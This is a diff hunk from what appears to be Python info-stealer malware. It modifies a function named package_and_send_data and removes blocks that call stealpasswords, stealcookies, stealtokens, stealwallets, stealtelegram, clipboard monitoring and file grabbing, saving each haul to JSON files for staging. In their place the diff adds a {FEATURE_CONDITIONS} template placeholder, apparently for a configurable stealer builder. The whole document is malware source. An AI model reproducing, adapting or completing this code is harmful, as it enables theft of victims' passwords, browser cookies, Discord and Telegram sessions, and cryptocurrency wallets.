@@ -5,86 +5,8 @@ def package_and_send_data():
     
     data = {}
     
-    # Passwords
-    try:
-        passwords = stealpasswords()
-        if passwords:
-            data['passwords'] = passwords
-            with open(os.path.join(data_dir, 'passwords.json'), 'w', encoding='utf-8') as f:
-                json.dump(passwords, f, indent=2)
-    except:
-        pass
-    
-    # Cookies
-    try:
-        cookies = stealcookies()
-        if cookies:
-            data['cookies'] = cookies
-            with open(os.path.join(data_dir, 'cookies.json'), 'w', encoding='utf-8') as f:
-                json.dump(cookies, f, indent=2)
-    except:
-        pass
-    
-    # Discord Tokens
-    try:
-        tokens = stealtokens()
-        if tokens:
-            data['tokens'] = tokens
-            with open(os.path.join(data_dir, 'tokens.json'), 'w', encoding='utf-8') as f:
-                json.dump(tokens, f, indent=2)
-    except:
-        pass
-    
-    # Wallets
-    try:
-        wallets = stealwallets()
-        if wallets:
-            data['wallets'] = wallets
-            with open(os.path.join(data_dir, 'wallets.json'), 'w', encoding='utf-8') as f:
-                json.dump(wallets, f, indent=2)
-    except:
-        pass
-    
-    # System Info
-    try:
-        system_info = getsysteminfo()
-        if system_info:
-            data['system_info'] = system_info
-            with open(os.path.join(data_dir, 'system.json'), 'w', encoding='utf-8') as f:
-                json.dump(system_info, f, indent=2)
-    except:
-        pass
-    
-    # Clipboard
-    try:
-        clipboard = monitorclipboard()
-        if clipboard:
-            data['clipboard'] = clipboard
-            with open(os.path.join(data_dir, 'clipboard.json'), 'w', encoding='utf-8') as f:
-                json.dump(clipboard, f, indent=2)
-    except:
-        pass
-    
-    # Telegram
-    try:
-        telegram = stealtelegram()
-        if telegram:
-            data['telegram'] = telegram
-            with open(os.path.join(data_dir, 'telegram.json'), 'w', encoding='utf-8') as f:
-                json.dump(telegram, f, indent=2)
-    except:
-        pass
-    
-    # Files
-    try:
-        files = grabfiles()
-        if files:
-            data['files'] = files[:50]
-            with open(os.path.join(data_dir, 'files.json'), 'w', encoding='utf-8') as f:
-                json.dump(files[:50], f, indent=2)
-    except:
-        pass
-    
+{FEATURE_CONDITIONS}
+
     # Create summary
     summary = {
         'timestamp': time.time(),
